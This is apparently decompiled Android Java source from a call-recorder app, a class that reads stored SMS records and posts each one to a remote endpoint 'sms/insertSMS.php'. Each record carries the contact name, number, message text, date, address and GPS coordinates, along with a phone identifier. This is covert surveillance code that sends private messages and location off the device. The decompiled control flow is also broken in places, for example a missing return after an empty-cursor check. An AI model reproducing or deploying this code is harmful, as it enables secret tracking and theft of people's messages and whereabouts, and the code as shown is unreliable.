package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.G;
import a.c.b.i0;
import a.c.e.a;
import a.c.e.e;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SendSMS */
public class m implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f285b;

    /* renamed from: a reason: collision with root package name */
    private final Context f286a;

    public m(Context context) {
        this.f286a = context;
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f286a.stopService(new Intent(this.f286a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:23:0x01a4 A[Catch:{ Exception -> 0x01aa }] */
    public synchronized void run() {
        try {
            if (f285b) {
                a();
                return;
            }
            f285b = true;
            i0 i0Var = new i0(this.f286a);
            i0Var.b();
            Cursor c2 = i0Var.c();
            if (c2 == null || c2.getCount() <= 0 || !c2.moveToFirst()) {
                i0Var.a();
                if (c2 != null) {
                    c2.close();
                }
                f285b = false;
                a();
            }
            do {
                G g = new G();
                g.a(c2.getInt(0));
                g.g(c2.getString(1));
                g.h(c2.getString(2));
                g.f(c2.getString(3));
                g.b(c2.getInt(4));
                g.c(c2.getString(5));
                g.b(c2.getString(6));
                g.e(c2.getString(7));
                g.d(c2.getString(8));
                g.a(c2.getString(9));
                HashMap hashMap = new HashMap();
                StringBuilder sb = new StringBuilder();
                sb.append("");
                sb.append(e.e(this.f286a));
                hashMap.put("idPhone", sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("");
                sb2.append(g.h());
                hashMap.put("name", sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("");
                sb3.append(g.i());
                hashMap.put("number", sb3.toString());
                StringBuilder sb4 = new StringBuilder();
                sb4.append("");
                sb4.append(g.g());
                hashMap.put("message", sb4.toString());
                StringBuilder sb5 = new StringBuilder();
                sb5.append("");
                sb5.append(g.j());
                hashMap.put("type", sb5.toString());
                StringBuilder sb6 = new StringBuilder();
                sb6.append("");
                sb6.append(g.c());
                hashMap.put("date", sb6.toString());
                StringBuilder sb7 = new StringBuilder();
                sb7.append("");
                sb7.append(g.b());
                hashMap.put("address", sb7.toString());
                StringBuilder sb8 = new StringBuilder();
                sb8.append("");
                sb8.append(g.f());
                hashMap.put("longitude", sb8.toString());
                StringBuilder sb9 = new StringBuilder();
                sb9.append("");
                sb9.append(g.e());
                hashMap.put("latitude", sb9.toString());
                StringBuilder sb10 = new StringBuilder();
                sb10.append("");
                sb10.append(g.a());
                hashMap.put("accuracy", sb10.toString());
                if (a.b("sms/insertSMS.php", (Map<String, String>) hashMap)) {
                    i0Var.a(g.d());
                }
            } while (c2.moveToNext());
            i0Var.a();
            if (c2 != null) {
            }
            f285b = false;
            a();
        } catch (Exception e2) {
            e2.getStackTrace();
        }
    }
}
